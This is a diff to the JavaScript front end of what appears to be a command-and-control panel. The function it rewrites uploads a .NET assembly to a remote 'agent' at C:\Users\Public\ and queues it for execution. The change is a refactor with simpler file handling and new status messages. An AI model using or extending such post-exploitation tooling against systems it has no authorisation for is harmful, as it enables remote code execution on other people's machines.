@@ -2709,57 +2709,55 @@ function setAsmArgs(args) {
 }
 
 async function executeAssemblyUpload() {
-  const agent = document.getElementById('asm-agent').value;
-  const file = document.getElementById('asm-file').files[0];
-  const args = document.getElementById('asm-args').value.trim();
-  const result = document.getElementById('asm-upload-result');
+  var agent = document.getElementById('asm-agent').value;
+  var fileInput = document.getElementById('asm-file');
+  var args = document.getElementById('asm-args').value.trim();
+  var result = document.getElementById('asm-upload-result');
 
-  if (!agent) { alert('Select an agent'); return; }
-  if (!file) { alert('Select a .NET assembly file'); return; }
+  if (!agent) { alert('Select an agent first'); return; }
+  if (!fileInput || !fileInput.files || fileInput.files.length === 0) { alert('Select a .NET assembly file first'); return; }
 
-  result.innerHTML = '<span style="color:var(--yellow)">Reading file & uploading...</span>';
+  var file = fileInput.files[0];
+  var remotePath = 'C:\\Users\\Public\\' + file.name;
 
-  // Read file as base64 (chunked to avoid stack overflow on large files)
-  const reader = new FileReader();
-  reader.onload = async function() {
-    const bytes = new Uint8Array(reader.result);
-    let binary = '';
-    const chunkSize = 8192;
-    for (let i = 0; i < bytes.length; i += chunkSize) {
-      binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunkSize));
+  result.innerHTML = '<span style="color:#f59e0b;">Step 1/2: Uploading ' + file.name + ' to agent...</span>';
+
+  // Step 1: Upload file to agent
+  var formData = new FormData();
+  formData.append('agent', agent);
+  formData.append('file', file);
+  formData.append('remote_path', remotePath);
+
+  try {
+    var uploadResp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
+    var uploadData = await uploadResp.json();
+    if (uploadData.error) {
+      result.innerHTML = '<span style="color:#ef4444;">Upload failed: ' + uploadData.error + '</span>';
+      return;
     }
-    const b64 = btoa(binary);
+    result.innerHTML = '<span style="color:#f59e0b;">Step 2/2: Executing assembly...</span>';
+  } catch(e) {
+    result.innerHTML = '<span style="color:#ef4444;">Upload error: ' + e.message + '</span>';
+    return;
+  }
 
-    // Upload the file to the agent instead of sending inline (more reliable for large assemblies)
-    const formData = new FormData();
-    formData.append('agent', agent);
-    formData.append('file', file);
-    formData.append('remote_path', 'C:\\Users\\Public\\' + file.name);
-
-    result.innerHTML = '<span style="color:var(--yellow)">Uploading assembly to agent...</span>';
-
-    // Step 1: Upload the file
-    try {
-      const uploadResp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
-      const uploadData = await uploadResp.json();
-      if (uploadData.error) { result.innerHTML = '<span style="color:var(--red)">Upload failed: '+uploadData.error+'</span>'; return; }
-    } catch(e) { result.innerHTML = '<span style="color:var(--red)">Upload error: '+e.message+'</span>'; return; }
-
-    // Step 2: Execute the uploaded assembly
-    const remotePath = 'C:\\Users\\Public\\' + file.name;
-    const cmdArgs = remotePath + (args ? ' ' + args : '');
-
-    try {
-      const resp = await fetch('/api/cmd', {
-        method:'POST', headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
-      });
-      const data = await resp.json();
-      if (data.error) { result.innerHTML = '<span style="color:var(--red)">'+data.error+'</span>'; return; }
-      result.innerHTML = '<span style="color:var(--green)">Assembly queued (task: '+data.task_id.substring(0,8)+'). Check terminal for output.</span>';
-    } catch(e) { result.innerHTML = '<span style="color:var(--red)">'+e.message+'</span>'; }
-  };
-  reader.readAsArrayBuffer(file);
+  // Step 2: Execute the uploaded assembly
+  var cmdArgs = remotePath + (args ? ' ' + args : '');
+  try {
+    var resp = await fetch('/api/cmd', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})
+    });
+    var data = await resp.json();
+    if (data.error) {
+      result.innerHTML = '<span style="color:#ef4444;">' + data.error + '</span>';
+      return;
+    }
+    result.innerHTML = '<span style="color:#10b981;">Assembly uploaded and queued (task: ' + data.task_id.substring(0,8) + '). Check terminal for output.</span>';
+  } catch(e) {
+    result.innerHTML = '<span style="color:#ef4444;">' + e.message + '</span>';
+  }
 }
 
 async function executeAssemblyInline() {
